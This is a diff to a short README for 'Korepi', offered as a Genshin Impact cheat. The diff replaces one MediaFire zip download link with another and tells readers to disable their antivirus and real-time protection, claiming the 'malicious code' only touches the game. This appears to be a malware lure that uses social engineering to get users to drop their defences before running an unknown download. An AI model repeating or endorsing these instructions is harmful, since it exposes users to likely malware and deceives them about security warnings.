@@ -1,6 +1,6 @@
 # Korepi (Ch3at GENSHIN)
 
-# [Download](https://www.mediafire.com/file/t8zgd805wcnyc4t/korepi.zip/file) 
+# [Download](https://www.mediafire.com/file/8fhfbuhabp98gt6/korepiupdate.zip/file) 
 
 # (NOTE: DISABLE ANTIVIRUS)
 # (*Don't worry, because this is a cheat game, and malicious code only interferes with the game's system, if you don't turn off anti-virus, they will understand this is malicious code even though they do not interfere with the system. When turning off anti-virus, turn off Real-time protection)*
